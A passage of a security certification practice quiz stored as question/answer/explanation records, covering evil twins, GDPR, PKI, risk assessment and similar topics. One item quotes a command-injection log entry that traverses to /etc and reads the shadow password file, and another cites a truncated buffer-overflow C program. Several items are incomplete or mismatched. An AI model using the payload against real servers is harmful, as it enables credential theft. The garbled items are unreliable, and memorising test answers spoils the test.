'correct':1,'explanation': 'A MicroSD HSM is a small form-factor hardware encryption and security module that can be added to any mobile device with a MicroSD card slot. These devices combine the storage function with HSM features, which can include generation and storage of encryption keys and certificates to interop with PKI solutions of local apps or network/Internet/cloud services. FDE will not address the lack of PKI support on the tablet. Full device encryption (FDE) is storage device encryption on a mobile device. Containerization will not address the lack of PKI support on the tablet. Containers and containerization can be employed in concert with mobile devices as a way to protect company assets from being lost or stolen. Containerization is based on the concept of eliminating the duplication of OS elements in a virtual machine. Instead, each application is placed into a container that includes only the actual resources needed to support the enclosed application and the common or shared OS elements are then part of the hypervisor. Screen locks will not address the lack of PKI support on the tablet. A screen lock is designed to prevent someone from casually picking up and being able to use your phone or mobile device. A screen lock will automatically lock the screen after an idle timeout and require authentication to regain use access to the device.',},
{ 'question': '  An InfoSec team member is performing a routing evaluation and inspection of the wireless network using a network packet sniffer. The authorized company WAP requires MFA and WPA2. He notices that several clients are transmitting in clear text. He confirms that the communication is going to a WAP with the correct MAC address and SSID. What could be taking place in this situation? ','answers': ['What could be taking place in this situation?','MAC filtering','Evil twin','Bluejacking',],
'correct':2,'explanation': 'This is a description of an evil twin attack. An evil twin mimics the external configuration of a WAP, such as MAC address, SSID, and wireless channel, and then offers a stronger signal. Since most clients prefer stronger signals, they will re-associate with the false evil twin WAP. The evil twin WAP will offer a nonauthenticated and plaintext (unencrypted) connection, which clients accept without question or notifying the user of the change. This is not a description of MAC filtering, which is the blocking of devices based on MAC address in either a allow-list or deny-list basis. This is not bluejacking as that is Bluetooth specific and only WiFi is mentioned in this scenario. This is not DNS poisoning, although a false WAP could perform this as well. For this question to be focusing on DNS poisoning there would need to be mentioning of domain names, false IP addresses, and maybe inability to access resources.',},
{ 'question': '  Which of the following is not a requirement of the GDPR? ','answers': ['Notification of data breach within 72 hours of discovery.','Subjects have the right to import their data into a data processor of their choosing.','A data protection officer (DPO) must be appointed.','Subjects have the right to erase their data held by a data processor/collector.',],
'correct':2,'explanation': 'The GDPR does not specify that subjects have the right to import their data into a data processor of their choosing. The GDPR does state that subjects have the right to access their data and transfer their data to another data processor. It does not state that another processor must accept or allow import of data from another processor. This is often assumed as the intention of the legislation, but it is not specifically required. The GDPR does specifically require notification of a data breach within 72 hours of discovery, that a data protection officer (DPO) must be appointed, and that subjects have the right to erase their data held by a data processor/collector.',},
{ 'question': '  The CISO has asked you to craft a draft of a company incident response plan. While eager to get to the complex details, you realize you have to also craft the document to be understood by the CEO to get it approved. So, how do you define the term “incident”? ','answers': ['Any occurrence that takes place during a certain period of time','Any person or tool that can take advantage of a vulnerability','The path or means by which an attack can gain access to a target to cause harm','An event that has a negative outcome affecting the confidentiality, integrity, or availability of an organization’s data',],
'correct':4,'explanation': 'An incident is an event that has a negative outcome affecting the confidentiality, integrity, or availability of an organization’s data. Any occurrence that takes place during a certain period of time is an event. A threat is any person or tool that can take advantage of a vulnerability. A threat vector is the path or means by which an attack can gain access to a target to cause harm.',},
{ 'question': '  During a meeting of company leadership and the security team, discussions focus on defining the value of assets, inventorying threats, predicting the amount of harm of a breach, and determining the number of times a threat could cause harm to the company each year. What is being performed? ','answers': ['Qualitative risk assessment','Delphi technique','Risk avoidance','Quantitative risk assessment',],
'correct':4,'explanation': 'This scenario is describing the activity of performing a quantitative risk assessment. The question describes the determination of asset value (AV) as well as the exposure factor (EF) and the annualized rate of occurrence (ARO) for each identified threat. These are the needed values to calculate the annualized loss expectancy (ALE) which is a quantitative factor. This is not an example of a qualitative risk assessment as specific numbers are being determined rather than relying upon ideas, reactions, feelings, and perspectives. This is not the Delphi technique, which is a qualitative risk assessment method, which seeks to reach an anonymous consensus. This is not risk avoidance, as that is an optional risk response or treatment, and this scenario is only describing the process of risk assessment.',},
{ 'question': '  The best defense against spoofed network traffic is ___________. ','answers': ['An ingress filter','A switch','A content filter','Loop prevention',],
'correct':1,'explanation': 'The best defense against spoofed network traffic is an ingress filter. None of these other three items addresses spoofed network traffic. A switch is used to connect individual systems or subnets together. A content filter is the security-filtering function in which the contents of the application protocol payload are inspected. Loop prevention are techniques to address a transmission pathway that repeats itself.',},
{ 'question': '  What type of token device produces new time-derived passwords on a specific time interval that can be used only a single time when attempting to authenticate? ','answers': ['HOTP','HMAC','SAML','TOTP',],
'correct':4,'explanation': 'The two main types of token devices are TOTP and HOTP. Time-based one-time password (TOTP) tokens or synchronous dynamic password tokens are devices or applications that generate passwords at fixed time intervals, such as every 60 seconds. Thus, TOTP produces new time-derived passwords on a specific time interval that can be used only a single time when attempting to authenticate. HMAC-based one-time password (HOTP) tokens or asynchronous dynamic password tokens are devices or applications that generate passwords not based on fixed time intervals but instead based on a nonrepeating one-way function, such as a hash or hash message authentication code (HMAC—a type of hash that uses a symmetric key in the hashing process) operation. HMAC is a hashing function, not a means to authenticate. Security Assertion Markup Language (SAML) is used to create authentication federation (i.e., sharing) links; it is not itself a means to authenticate.',},
{ 'question': '  A client system has been involved in an intrusion incident. There is concern that files on the system have been stolen by the attacker. This system was using certificates to authenticate to the network. Which of the following actions should be performed FIRST as a mitigation strategy to secure the environment? ','answers': ['Revoke the certificate of the endpoint','Issue a new certificate to the client system','Reissue the certificate to the system with a revised expiration date','Install the latest updates and patches onto the endpoint',],
'correct':1,'explanation': 'The best FIRST step of mitigation in this scenario is to revoke the certificate of this compromised client endpoint system. While the scenario does not specifically indicate that the certificate file was stolen, the potential that it could have been is sufficient to warrant this response. The other options are incorrect as a first mitigation step. Issuing a new certificate is the step to perform after revocation of the potentially compromised certificate. Reissuance is not a secure task in this situation as it could still allow the attacker to impersonate the valid system. Installing updates and patches is good security management, but not the first step to mitigate this issue in this scenario.',},
{ 'question': '  A new wireless access point has been installed in your office. You want to determine what areas of the office receive the strongest and weakest signals as well as whether the access point can be reached from outside of your office. This activity is known as what? ','answers': ['A site survey','Penetration testing','Risk assessment','Business continuity planning',],
'correct':1,'explanation': 'This activity is known as a site survey. Penetration testing uses cracking tools to test a security perimeter. Risk assessment evaluates the risks of a secured environment. Business continuity planning is used to support business operations when processes are threatened.',},
{ 'question': '  An application stress test is being performed by a red-team. The focus is on a load-balancing service managing access to a mission critical database. The redteam has asked for full access to the load-balancing system. However, the security administrator is reluctant to provide such access as the load-balancer also hosts several other critical services that are not the focus of the test. What is the best option for the security administrator? ','answers': ['Provide the red-team with full access to the database and load balancer.','Disable all services on the load-balancing system until the test is concluded.','Give the red-team read-only access.','Require that the red-team perform the test only over the weekend.',],
'correct':3,'explanation': 'The best option offered here is to give the red-team read-only access as this protects the integrity and availability of the other services not involved in the test. Plus, a stress test usually only requires read access to place a high workload on a service or system. Giving the red-team full access puts the missioncritical services at risk when this is not necessary. Disabling all other services is not a viable option as those other services are also mission-critical. Limiting the red-team to operate only on the weekend is not relevant as they need to be assigned some level of access, no matter when they are running the test.',},
{ 'question': '  A compromise of a WiFi-connected baby monitor enabled a hacker to virtually invade a home and play scary sounds to a startled toddler. How was the attacker able to gain access to the baby monitor? ','answers': ['Outdated malware scanners','A WAP supporting 5 GHz channels','Performing a social engineering attack against the parents','Exploiting default configuration',],
'correct':4,'explanation': 'The most likely reason the attacker was able to gain access to the baby monitor was through exploitation of default configuration. This is an unfortunately common issue with IoT equipment connected to WiFi networks. Unless malware was used in the attack, a malware scanner would not be relevant to this situation. This type of attack is possible over any network type and all WiFi frequency options. There was no mention of any interaction with the parents and such was not required with a device using its default configuration.',},
{ 'question': '  An organization has recently hired a data protection officer (DPO). The DPO needs to implement new security strategies to prevent a recurrence of a privacy breach that took place earlier in the year. Which of the following is often a key motivator for a company to treat privacy protection seriously? ','answers': ['Reputation damage','Reduction of service functions','Optimized efficiency','Use of pseudo-anonymization',],
'correct':1,'explanation': 'From this list of options, reputation damage is the most likely motivator for a company to treat privacy protection seriously. Other top motivators are regulations and fines, risk of identity theft, and IP theft. The functions of a service are typically not affected by a privacy breach. The perspective on whether a company’s services are worthwhile or secure are what is affected by a privacy breach. Privacy breaches do not relate to optimized efficiency. Pseudo-anonymization is a potential tool to protect private data, but it not a reason to defend privacy.',},
{ 'question': '  A review of end-user and endpoint security has uncovered the concern that most systems will indefinitely display confidential data on the screen even when a user is no longer sitting at the workstation. How should this issue be resolved? ','answers': ['Enforce screensavers after a timeout via a GPO','Implement MFA','Train users not to share accounts','Update awareness information to discourage shoulder surfing',],
'correct':1,'explanation': 'To enforce screensavers after a timeout via a GPO will hide any confidential materials behind a screensaver which should then require a valid logon to regain access to the desktop, applications, etc. MFA is a solid security measure, but it is irrelevant here. Users should not share accounts, but that is not relevant to this issue. Shoulder surfing is a problem here, although there is no shoulder to look over, but information disclosure to unauthorized entities is a security violation. However, reminding everyone about shoulder surfing does not address the issue of monitors continuing to display confidential materials.',},
{ 'question': '  Bob wants to send a document to Alice. He needs to ensure that no one other than Alice can read the document. When crafting the message, which of the following would be most appropriate for Bob to use? ','answers': ['Sender’s private key','Recipient’s private key','Sender’s public key','Recipient’s public key',],
'correct':4,'explanation': 'This situation calls for encrypting the document with a symmetric key and then enveloping that key with the recipient’s public key. Thus, the recipient’s public key is what Bob should use. Bob does not need to use his own sender’s private key, as that is used to create a digital signature, which is not needed in this scenario. Bob cannot ever use the recipient’s private key. And Bob should not use his own sender’s public key because he needs the digital envelope to be sent to Alice, not to himself.',},
{ 'question': '  A worker has repeatedly installed unauthorized applications. They have been through security training, signed the AUP, and been reprimanded several times. Each time a violation occurs, that item is added to the blocklist. But the worker then installs another version or different unauthorized code. What security mechanism can be implemented to address this issue? ','answers': ['Termination','IDS','Allow listing','DLP',],
'correct':3,'explanation': 'The best security mechanism in this situation is to use allow listing. Thus, only pre-approved software can be installed or executed on company systems. This is a better solution than the blocklist system already in use, while a blocklist will stop repeats of the same malicious code, it does not address or stop new items not on the blocklist. Termination would remove this one worker from the environment, but the issue is that any worker could install unauthorized software, and firing just one employee does not address that concern. Maybe both should be done, but you are forced to make a single answer selection for this question. An IDS may alert administrators when unwanted activity (i.e., unauthorized software installation) occurs, but it does not prevent it. DLP is not the appropriate security tool for this scenario.',},
{ 'question': '  What type of security zone can be positioned so it operates as a buffer between the secured private network and the Internet and can host publicly accessible services? ','answers': ['Honeypot','Screened subnet','Extranet','Intranet',],
'correct':2,'explanation': 'A screened subnet is a type of security zone that can be positioned so it operates as a buffer network between the secured private network and the Internet and can host publicly accessible services. A honeypot is a false network used to trap intruders; it isn’t used to host public services. An extranet is for limited partner access, not public. An intranet is the private secured network.',},
{ 'question': '  The company’s security analyst identified an XML injection attack against their public web server. Which of the following actions is the FIRST step to remediate the vulnerability and prevent the reoccurrence of the attack? ','answers': ['Implement prepending','Implement proper error handling','Implement input validations','Implement XSRF filtering',],
'correct':3,'explanation': 'The most common cause of injection attacks, whether XML, SQL, LDAP, or otherwise, is the lack of input filtering and sanitation. Thus, the best first step in remediating and preventing this issue is implementing input validations. Prepending is a social engineering technique to add common email subject indicators to a message to give it context and have it seem valid, it is a form of pretexting (i.e., establishing a believable story). Proper error handling is always a good security measure, but it isn’t directly relevant here as errors are not the problem, allowing XML commands as input is the issue. XSRF filtering is not relevant here either, which usually involves verifying that the visitor is a human user rather than an automated robot or malicious code as well as limiting the range of functions or commands a user can perform.',},
{ 'question': '  Which of the following establishes mandatory requirements for federal agencies? ','answers': ['Risk Management Framework','Cybersecurity Framework','ISO 27001','Center for Internet Security',],
'correct':1,'explanation': 'RMF establishes mandatory requirements for federal agencies. CSF is designed for critical infrastructure and commercial organizations. ISO 27001 establishes the guidelines for implementing an information security management system (ISMS) but is nation and industry agnostic. Center for Internet Security (CIS) provides OS, application, and hardware security configuration guides for a wide range of products',},
{ 'question': '  You are the network manager for a large organization. Over the weekend a storm caused a power surge, which damaged the main router between the company network and the Internet service. On Monday morning you realize that the entire intranet is unable to connect to any outside resource and missioncritical tasks are not functioning. What is the problem that the organization is experiencing? ','answers': ['Sustained redundancy','Maintaining of availability','Load-balanced distribution of job tasks','A single point of failure',],
'correct':4,'explanation': 'A single point of failure is any individual or sole device, connection, or pathway that is of moderate to mission-critical importance to the organization. If that one item fails, the whole organization suffers loss. Infrastructures should be designed with redundancies of all moderately or highly important elements to avoid single points of failure. Removing single points of failure involves adding redundancy, recovery options, or alternative means to perform business tasks and processes. Avoiding or resolving single points of failure will improve stability, uptime, and availability. The problem in this scenario is a failure to sustain redundancy and maintain availability. This scenario does not represent a load-balanced distribution of job tasks.',},
{ 'question': '  The CISO has just concluded the incident response efforts to restore the company’s systems to their pre-intrusion state. Now, she works on establishing attribution of the attack. Data is gathered from the internal systems that helps to deduce the means, motivations, and opportunities of the attackers. Internal log files indicate the tools and methodologies that there used during the compromise. What is the CISO attempting to pull together with this research? ','answers': ['OSINT','A vulnerability database','Adversary tactics, techniques, and procedures','The contents of an RFC',],
'correct':3,'explanation': 'Adversary tactics, techniques, and procedures (TTP) is the collection of information about the means, motivations, and opportunities related to APTs. The goal of collecting TTP information is to gain a fuller understanding of who the group is, what their purposes and intentions are, as well as discovering their reconnaissance and attack techniques. TTP is often used in establishing attribution (i.e., assigning responsibility). This scenario is not focused on gathering OSINT, establishing a vulnerability database, nor producing and RFC. OSINT is the gathering of information from any publicly available resource; this scenario focuses on internal data sources. Vulnerability databases are indexes and repositories of information about threats, exploits, and attacks, but they are not focused on a single incident, but are a collection of attacks across time and from all possible targets. Request for comments (RFC) is a type of document drafted by the technical community that defined, describes, and prescribes technology specifications; it is not derived from or based upon breach information.',},
{ 'question': '  _____________ is the act of conforming to or adhering to rules, policies, regulations, standards, or requirements. This is an essential element of security governance. ','answers': ['Compensation','Regulations','Compliance','SOC 2 Type 1',],
'correct':3,'explanation': 'Compliance is the act of conforming to or adhering to rules, policies, regulations, standards, or requirements. Compliance is an essential element of security governance. The other answers are incorrect. A compensation control is deployed to provide various options to other existing controls to aid in enforcement and support of security policies. It can be any control used in addition to, or in place of, another control. Regulations are requirements placed on organizations and their leadership by government agencies that dictate. A SOC 2 report focus on security controls, specifically “Report on Controls at a Service Organization Relevant to Security, Availability, Processing Integrity, Confidentiality or Privacy.” A Type 2 report (a subtype of SOC) assesses the effectiveness of implemented controls.',},
{ 'question': '  Which of the following tools can be used to perform unauthorized zone transfers? ','answers': ['ping and ifconfig','nmap and netcat','nslookup and dig','curl and sn1per',],
'correct':3,'explanation': 'The tools nslookup and dig are the only DNS-specific tools in this list, and they can potentially be used to perform unauthorized zone transfers. Ping is used to check if a remote system is online and if the path to that system supports communication. Ifconfig is the Linux CLI utility for viewing and changing NIC settings. Nmap is a port scanner and does have some DNS query capabilities, but netcat is primarily used for redirecting output to another system over a network link. Curl is a URL processing tool, and sn1per is an automated pentest recon scanner.',},
{ 'question': '  A company has just recently allowed its workers to elect to work from home rather than traveling into a central office each day. The company has issued new laptops to these new telecommuters and then relocated their existing desktop systems in the office datacenter. Remote workers are using RDP to connect into their desktop system to perform all work functions. If RDP is not configured properly, what security issue could arise? ','answers': ['An on-path attack that could allow for capture of credentials and trade secrets','A vishing attack','The installation of spyware and keystroke loggers on the remote laptops','An SSL striping attack when visiting Internet sites',],
'correct':1,'explanation': 'The use of misconfigured remote desktop protocol (RDP) could result in a plaintext connection that would allow for an on-path attack that could capture credentials and trade secrets. It is extremely important to ensure that all means of remote access are enforcing robust authentication and encryption. This is not a vishing attack as no form of audio communication (such as VoIP, landline, or mobile phone) is mentioned. Whether or not RDP is configured correctly has no impact on whether spyware and keystroke loggers can be installed onto remote laptops. This could be accomplished whether RDP is secure or not, by malware accessed via the company network or through direct Internet access. RDP and SSL striping are distinct concepts and not related to each other. Whether or not RDP is properly configured does not affect whether the client is vulnerable to SSL stripping if the laptop is used to visit Internet sites; that is dependent upon the browser’s configuration and update/patch level.',},
{ 'question': '  While traveling, a worker connects their company issued computer to a hotel WiFi network, since the cellular data service was inconsistent. After checking email, performing online research, posting a message to a company discussion forum, and updating his itinerary in the company scheduling service, he disconnects. A few days later, the company experiences an intrusion, and trade secrets are stolen by an unknown attacker. The incident investigation revealed that the credentials used to gain access to the company during the breach belonged to the remote worker. What was the cause of the company compromise? ','answers': ['Social engineering','AUP violation','Pivoting','BEC',],
'correct':2,'explanation': 'The most likely cause of this incident was an AUP violation. If a company-issued computer has a cellular data service, it is likely there is a prohibition of using open WiFi networks. The use of a hotel network may have exposed the worker’s connection to interception and eavesdropping granting the attacker knowledge of the company network and the worker’s credentials. There is no indication that the incident was related to social engineering by the information provided in the scenario. Pivoting is not a reason for a breach, but is a technique used by attackers to target additional systems once an initial system compromise is successful. Business email compromise (BEC) is not likely the cause of this incident as described in the scenario. BEC usually results in financial theft.',},
{ 'question': '  Which of the following would result in the worst security for an environment? ','answers': ['Failing to apply a recent software patch','Using guard dogs instead of security guards','Not reviewing the audit trails of client systems','Lack of physical access control',],
'correct':4,'explanation': 'Without physical access control, there is no security. An environment’s security can be maintained despite poor management, such as not applying software patches, using the wrong protection solution, or not reviewing all audit trails. Some software patches may not be installed as they could introduce other vulnerabilities or interfere with essential business tasks. Many companies compensate for this with other controls. Security guards may be too expensive when compared to guard dogs, especially if the primary need is perimeter breach detection. Reviewing audit trails of client systems could be useful, but as long as server audit trails are being evaluated, this could be a reasonable security management decision.',},
{ 'question': '  What form of federation trust should be established between domain entities A and B as well as B and C for members of each domain to be able to access the resources of all three of the linked domains? ','answers': ['One-way nontransitive trusts','One-way transitive trusts','Two-way nontransitive trusts','Two-way transitive trusts',],
'correct':4,'explanation': 'Federation trusts can be stablished in various combinations of one-way or two-way and transitive or nontransitive. Two-way transitive trusts between domains A and B as well as B and C will link all three domains in such a way that members of any domain can access resources in any other domain. Oneway nontransitive trusts would allow resource access in only one direction and only to a directly trusted entity (i.e., a trust from A to B and another from B to C would allow A to access B, but not C, and B to access C). One-way transitive trusts would only allow resource access in one direction but would span three entities (i.e., a trust from A to B and another from B to C would allow A to access B and C and B to access C). A two-way nontransitive trust would allow immediate partners to share only (i.e., a trust between A and B and another between B and C would allow A and B to access each other and B and C to access each other).',},
{ 'question': '  A developer is testing the resilience of an OS that has all the latest vendor-released updates installed. The following code was executed on the system that caused the OS to lock up after a few moments: #include ˂stdio.h˃ #include ˂string.h˃ #include ˂stdlib.h˃ int main(int argc, char *argv[]) { char buffer[5]; if (argc ˂ 2) { What was the cause of the system lockup? ','answers': ['Buffer overflow','Object dereference','LDAP injection','Time-of-check-to-time-of-use',],
'correct':1,'explanation': 'This is a C program that uses the strcpy() function, which is unbounded, thus allowing for a buffer overflow. This program accepts input from the command line when executed, and if that input is longer than 5 bytes it causes a buffer overflow as that was the limit set. Even if you are not a C programmer, just looking for one of the common unbounded functions, such as strcat(), strcpy(), sprintf(), vsprintf(), memcpy(), bcopy(), getwd(), scanf(), or gets() can inform you that the vulnerability of buffer overflow is present in a section of code. The issue here is not object dereference, which is the programmatic activity of retrieving the value stored in a memory location by triggering the pulling of the memory based on its address or location as stored in a pointer. This is not LDAP injection; notice that there is no mention of a URL or directory service system by name or IP address. This is not a time-of-check-to-time-of-use (TOCTTOU or TOC/TOU) attack, which is often called race condition attacks because the attacker is racing with a legitimate process to replace the authorized object before it is used or accessed to violation authorization.',},
{ 'question': '  Kerberos is an example of which of the following security technologies? ','answers': ['Physical access control','Monitoring system','Single sign-on','Authentication factor',],
'correct':3,'explanation': 'Kerberos is an example of a single sign-on security technology. A access control vestibule is an example of a physical access control device. Auditing is an example of a monitoring system. A password is an example of an authentication factor.',},
{ 'question': '  Your company is evaluating several CSPs to determine which is the best fit to host your custom services in a PaaS solution. There are many aspects of security controls you need to evaluate, but the primary issues include being able to process significant amounts of data in short periods of time, controlling which applications can access which assets, and being able to prohibit VM sprawl or repetition of operations. Which of the following statements is not relevant to this selection process? ','answers': ['Collections of entities, typically users, but can also be applications and devices, which can be granted or denied access to perform specific tasks or access certain','A VM, VDI, or VMI instance that serves as a virtual endpoint for accessing cloud assets and services','The ability of a cloud process to use or consume more resources (such as compute, memory, storage, or networking) when needed','A management or security mechanism is able to monitor and differentiate between numerous instances of the same VM, service, app, or resource',],
'correct':2,'explanation': 'Option B defines a virtual private cloud (VPC) endpoint, which is effectively a VM, VDI, or VMI instance that serves as a virtual endpoint for accessing cloud assets and services. This concept is not specifically relevant to nor a requirement of this cloud scenario. The remaining items are relevant to the selection process in this scenario. These are all compute security-related concepts. (A) Security groups are collections of entities, typically users, but can also be applications and devices, which can be granted or denied access to perform specific tasks or access certain resources or assets. This supports the requirement of controlling which applications can access which assets. (C) Dynamic resource allocation (aka elasticity) is the ability of a cloud process to use or consume more resources (such as compute, memory, storage, or networking) when needed. This supports the requirement of processing significant amounts of data in short periods of time. (D) Instance awareness is where a management or security mechanism is able to monitor and differentiate between numerous instances of the same VM, service, app, or resource. This supports the requirement of prohibiting VM sprawl or repetition of operations.',},
{ 'question': '  A new WAP is being deployed to support wireless connections. Prior connectivity was limited to cables only. During deployment, the security manager realizes that they must install a digital certificate to the WAP and all mobile devices. What authentication technology is being enforced on the WAP? ','answers': ['EAP-FAST','LEAP','EAP-TLS','WPS',],
'correct':3,'explanation': 'EAP-TLS requires the use of certificates for authentication. EAP-FAST does not use certificates and was a failed Cisco alternative to LEAP. LEAP is insecure. WPS is a means to automatically authenticate a new mobile device to a WAP, but it does not use certificates.',},
{ 'question': '  George is a security analyst. He is looking for unauthorized tools and utilities on workstations that can be used to violate company security policy. After using a free malware scanner, which of the following items is most likely to have been overlooked? ','answers': ['Sniffer','Spyware','Rootkit','Cryptomalware',],
'correct':1,'explanation': 'A sniffer is the only item on this list that is not typically categorized as malicious code and instead is labeled as a potentially unwanted program (PUP). A PUP is absolutely an unauthorized tool that could be used to violate company security policy and is likely not detected by low-end or free malware scanners. Spyware, rootkits, and cryptomalware are all specific examples of malware that most malware scanners will be looking for. A malware scanner is not guaranteed to file all possible malware, but that wasn’t the focus of the question.',},
{ 'question': '  A financial organization is offering a new bill pay service to its customers across the country. They are working with a CSP to ensure high levels of availability across time zones. The CSP has regional data centers and claims to provide services that are highly available with a downtime of less than five minutes per year. What level of uptime is this CSP claiming? ','answers': ['Two 9s','Three 9s','Five 9s','Seven 9s',],
'correct':3,'explanation': 'Five 9s (aka 99.999%) of availability allows for 5.26 minutes of downtime per year. This is the level of high availability this CSP is claiming. Two 9s (aka 99%) of availability of uptime allows for 3.65 days of downtime per year. Three 9s (aka 99.9%) of availability allows for 8.77 hours of downtime per year. Seven 9s (aka 99.99999%) of availability allows for 3.16 seconds of downtime per year.',},
{ 'question': '  What can birthday attacks focus on? ','answers': ['Asymmetric keys','Digital certificates','Hashing','Encrypted files',],
'correct':3,'explanation': 'Birthday attacks can focus on hashing. Mathematical and social engineering attacks focus on asymmetric keys and encrypted files. Intrusions to certificate authorities (CAs) may be used against digital certificates.',},
{ 'question': '  The CSO has instructed the IT group to remove all FTP services and replace them with SFTP. This will include replacing server software, client utilities, updating security policy, revising procedures, and reconfiguring boundary devices. To comply with this change, the ports of FTP need to be closed and ports for SFTP need to be open. What port should be enabled to allow for the new secure exchange of files? ','answers': ['21','22','23','25',],
'correct':2,'explanation': 'TCP port 22 is the default service port of SFTP (SSH FTP/Secure FTP). TCP port 21 is used by plaintext FTP, 23 by telnet, and 25 by SMTP.',},
{ 'question': '  A user visits an e-commerce website to purchase several items. After placing three products into the digital shopping cart, the user clicks the checkout button. The user is prompted for their name and password credentials, which the user provides. Immediately, the user’s phone indicates that a message has been received and it contains an eight-digit number. What is the process that is now going to take place? ','answers': ['Something you are authentication','Static code authentication','SMS-based second-factor authentication','Attestation authentication',],
'correct':3,'explanation': 'This scenario is an example of an SMS-based second-factor authentication. The user receives an SMS text message with a code that the website requires to be typed in before completing the logon process. This is a common practice of many websites as a simple-to-use improvement over single-factor authentication. This is not a something you are authentication, as that is biometric authentication and there is no mention of presenting a body part in this scenario. This is not static code authentication as that would not be sent in real time as a text message; instead, it would have been a number defined or provided to the user upon account creation. A PIN is an example of a static code. This is not attestation authentication. Attestation is proof or evidence of something. In some circumstances, attestation is when something is signed by a witness to prove its origin or veracity. Attestation can be the record of an event having taken place, such as a log file or an audit report.',},
{ 'question': '  A recent system compromise occurred that resulted in several data sets being exfiltrated. The investigation traced the data flow to a cloud storage service. What forensic tool should be used to preserve the data and any related logs prior to collection? ','answers': ['Legal hold','EDRM','Containment','Isolation',],
'correct':1,'explanation': 'A legal hold is an early step in the evidence collection or e-discovery process. It is a legal notice to a data custodian that that specific data or information must be preserved and that good-faith efforts must be engaged to preserve the indicated evidence. The Electronic Discovery Reference Model (EDRM) or e-Discovery is a forensic framework that prescribes the primary activities of digital evidence discovery, collection, and processing. However, it is more of a preparation tool to be used by an organization rather than an actual means of performing forensic data acquisition. Containment is a stage of IR, not forensics. Isolation is the act of keeping something separated from others, it is often a proactive solution to prevent problems before they occur. Thus, it is not relevant to this scenario.',},
{ 'question': '  A breach of the company network has been traced to the compromise of a Windows XP system. A review of this system confirms that all available updates and configuration changes have been applied. This system was running a custom business application, which has not yet been migrated to the cloud, but which is scheduled to be developed in the next six months. What is the reason for the breach? ','answers': ['EOL','Social engineering','Default configuration','Lack of support for VPNs',],
'correct':1,'explanation': 'This scenario’s breach was due to the use of an end-of-life system, the Windows XP computer. Windows XP support ended in 2014. Even with all available updates installed, it would still be insecure as many years of new attacks and exploits against XP have been developed by attackers. There is no indication in this scenario that social engineering was the cause of the breach. The scenario indicates that the system was current on updates and configuration, so it was not using a default configuration. This scenario had no mention of a VPN and thus whether or not the system supported a VPN is not related to the cause of the breach.',},
{ 'question': '  The security officer is concerned that the authentication system is not locked down sufficiently. He has proposed several changes to improve the system including requirement password complexity, using password history, and implementing account lockout. What is the primary reason to maintain a password history? ','answers': ['Monitor account logins','Force complexity requirements compliance','Provide for legal investigations','Prevent password reuse',],
'correct':4,'explanation': 'Password history is an authentication protection feature that tracks previous passwords (by archiving hashes) to prevent password reuse. Monitoring account logins is an auditing process to detect abuses. Enforcing complexity requirements is a good password security measure, but it is not related to password history. Logs, audit trails, and other evidence may provide for legal investigations, but password history is not relevant to that purpose.',},
{ 'question': '  While reviewing files present on a central server, you notice a file that you don’t recognize. It has an odd name: pwnedserverdeets.txt. The file contains output of a tool that shows port status, enumerated application details, and the OS type and version in use. What tool likely produced the contents of this file? ','answers': ['netstat','route','theHarvester','nmap',],
'correct':4,'explanation': 'nmap was used to produce the output contained in this strange file. The command nmap is a network mapper or port scanner. The nmap tool can be used to perform a wide range of network discovery and enumeration functions, including ping sweeping, port scanning, application identification, operating system identification, firewall and IDS evasion, and a plethora of script functions to discover details about target applications and OSs. netstat was not used to produce this output. The command netstat displays information about active TCP sessions of a system. The output options include displaying the source and destination IP address and port number of connections, listing the program associated with a connection, showing traffic bytes, displaying Ethernet statistics, showing the FQDN for external addresses, and displaying the routing table. route was not used to produce this output. The route command is used to view and manipulate the routing table of a system. theHarvester was not used to produce this output. theHarvester is used for OSINT gathering. It automatically interacts with dozens of online datasets, search engines, and information services to produce a dossier on the specified target. Output from this tool lists email addresses, subdomains, IP addresses, URLs, and other related facts about a target’s domain name.',},
{ 'question': '  A web browser initiates a connection with a web server. This starts the TLS handshake process. An early step in that process is to determine the strongest cipher suite that both endpoints have in common. What is a cipher suite? ','answers': ['A standardized collection of authentication, encryption, and hashing algorithms used to set or define the parameters for a security network communication','A communication tunnel between two entities across an intermediary network','A storage process by which copies of private keys and/or secret keys are retained by a centralized management system','A process by which one communication is hidden inside another communication',],
'correct':1,'explanation': 'A cipher suite a standardized collection of authentication, encryption, and hashing algorithms used to set or define the parameters for a security network communication. A VPN is a communication tunnel between two entities across an intermediary network. Key escrow is a storage process by which copies of private keys and/or secret keys are retained by a centralized management system. Steganography is a process by which one communication is hidden inside another communication.',},
{ 'question': '  A company has been migrating it’s on-premises IT environment to an IaaS. The CSP is providing an automated management solution to ensure that the cloud services provide equivalent security as was present on premises. What service is being used for this? ','answers': ['UEM','RCS','CASB','SAE',],
'correct':3,'explanation': 'The goal of a CASB is to enforce proper security measures and ensure that they are implemented between a cloud solution and a customer organization. Unified Endpoint Management (UEM) is an MDM for mobile, PC, IoT, wearables, ICS, and other devices. RCS is an improved messaging service. SAE is an improved password authentication process for WPA3.',},
{ 'question': '  A log on a publicly accessible web server in the screened subnet contains the following entry: 220.181.38.251 - - [17/May/2020:14:09:12 +0500] "GET /inventoryService/inventory/purchaseItem?userId=8675309&itemId=42;cd%20../../../etc;cat%20shadow%20˃%20 What type of attack is being attempted? ','answers': ['Command injection','Integer overflow','Error handling','Directory traversal',],
'correct':1,'explanation': 'This is an example of a command injection against an Apache web server hosted on a Linux (or similar) OS. The attempted commands to be run on the target were to change to the root directory of the system, then into the /etc/ folder, then perform a concatenation (i.e., display contents of) command with cat of the shadow file (a file containing password hashes), but which is redirected with the > operator to be saved into the null.txt file. This is not an integer overflow, as there are no commands to inject mathematical operations into a vulnerable application. This is not an issue with error handling. In fact, because the 401 error was logged, it showed that this attempt failed with an error of “Unauthorized.” There is no indication of what was shown to the attacking user. So, while there could have been poor error handling, there is no direct evidence of that. This attack does include directory traversal, that is, what the series of ../s represent, but directory traversal is only a small part of this attack and thus not the best answer. This is another trick to watch out for on the exam; there can be more than one correct answer, but one should be more correct (or at least more specific) than the others.',},
{ 'question': '  A company’s OCSP server seems to be under constant DoS attacks. When the OCSP server is unable to respond to queries, user systems are default rejecting the company’s valid certificates. This is causing a significant increase in technical support tickets to address the issue. What alternative mechanism could be used to resolve this concern? ','answers': ['CRL','Stapling','Pinning','Wildcards',],
